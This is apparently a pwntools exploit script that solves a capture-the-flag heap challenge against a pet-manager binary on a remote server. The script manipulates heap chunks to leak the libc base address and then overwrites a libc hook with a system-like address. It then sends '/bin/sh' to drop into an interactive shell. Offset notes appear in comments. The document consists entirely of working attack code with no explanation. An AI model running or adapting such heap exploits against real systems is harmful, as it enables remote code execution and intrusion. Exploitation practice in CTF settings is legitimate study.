from pwn import *
#context.log_level='debug'
context.arch='amd64'
def cmd(c):
	p.sendlineafter(":\n",str(c))
def add(name,c=0,idx=0,age=0xcd):
	cmd(1)
	cd(c)
	cmd(idx)
	p.sendlineafter(":",name)
	cmd(age)
def show(c=0,idx=1):
	cmd(2)
	cd(c)
	cmd(idx)
def cd(c=0):
	if(c==1):
		p.sendlineafter("?\n",b"cat")
	elif(c==0):
		p.sendlineafter("?\n",b"dog")
def mana():
	cmd(3)
def sel(c=0,idx=0):
	cmd(1)
	cd(c)
	cmd(idx)
def edita(n,c=0):
	cmd(2)
	cd(c)
	p.sendlineafter("dd\n",str(n))
def editn(n,c=0):
	cmd(3)
	cd(c)
	p.sendlineafter(":",n)
def bitmap(idx,v=1):
	res=[0]*0x80
	res[idx*2]=v
	return bytes(res)
#p=process("./pwn")
p=remote("39.105.37.172",30012)
add("A"*0x460,0,99)#sp == > 0x555555579e80
add("A",0,0x51)
add("A",0,0)
add("A"*0x40,1)#sp == > 0x555555579e80
mana()
sel(0,99)
sel(1)
cmd(4)
add("n133",0,99)#sp == > 0x555555579e80
add("X"*0x11,1,69,0xff)
mana()
edita(0x50,0)
cmd(4)
show(1,69)
p.readuntil(":")
base=u64(p.read(8))-(0x7ffff7dafbe0-0x7ffff7bc4000)
log.warning(hex(base))
add("A",1,13)
mana()
sel(1,13)
cmd(4)
add("free",1,13)
mana()
pay=bitmap(3)+p64(0)*3+p64(base+0x1eeb28-8)
editn(b'\0'*0x6+p8(1)+b'\0'*(0x80-7)+p64(0)*3+p64(base+0x1eeb28-0x10),1)

cmd(4)
#gdb.attach(p,'b *0x000555555557E80')
cmd(1)
cd(1)
cmd(14)
pay=b"/bin/sh\0"*2+p64(base+0x55410)
p.sendlineafter(":",pay.ljust(0x28,b"A"))

p.interactive()
# cat-vtable: 	0x555555565B68
# cat-array: 	0x555555566300
# cat-real-array 0x555555578ec0
# slector 0x000055555557ce40
